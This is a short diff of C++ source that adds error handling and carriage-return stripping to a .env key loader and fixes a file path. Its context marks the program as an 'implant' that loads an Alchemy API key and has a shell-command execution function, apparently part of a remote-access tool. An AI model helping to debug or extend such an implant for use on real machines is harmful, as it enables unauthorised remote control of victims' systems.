@@ -10,15 +10,29 @@
 
 std::string getEnvVar(const std::string& filepath, const std::string& key) {
     std::ifstream file(filepath);
+    
+    // 1. Check if the file actually exists and can be opened
+    if (!file.is_open()) {
+        std::cout << "[-] DEBUG: Cannot find or open file at: " << filepath << std::endl;
+        return "";
+    }
+
     std::string line;
-    std::string searchKey = key + "=";
+    std::string searchKey = key + "="; // Strict match: "ALCHEMY_API_KEY="
+    
     while (std::getline(file, line)) {
         if (line.find(searchKey) == 0) { 
             std::string val = line.substr(searchKey.length());
+            // Strip double quotes
             val.erase(std::remove(val.begin(), val.end(), '\"'), val.end());
+            // Strip hidden Windows carriage returns (\r)
+            val.erase(std::remove(val.begin(), val.end(), '\r'), val.end());
             return val;
         }
     }
+    
+    // 2. The file opened, but the key wasn't formatted correctly inside
+    std::cout << "[-] DEBUG: File opened successfully, but could not find exact string: " << searchKey << std::endl;
     return "";
 }
 
@@ -89,7 +103,7 @@ std::string executeShellCommand(const std::string& command) {
 int main() {
     std::cout << "[*] Waking up implant. Loading from .env..." << std::endl;
 
-    std::string apiKey = getEnvVar("../../hub/.env", "ALCHEMY_API_KEY");
+    std::string apiKey = getEnvVar("../hub/.env", "ALCHEMY_API_KEY");
     if (apiKey.empty()) {
         std::cout << "[-] FATAL: Could not locate ALCHEMY_API_KEY" << std::endl;
         return 1;
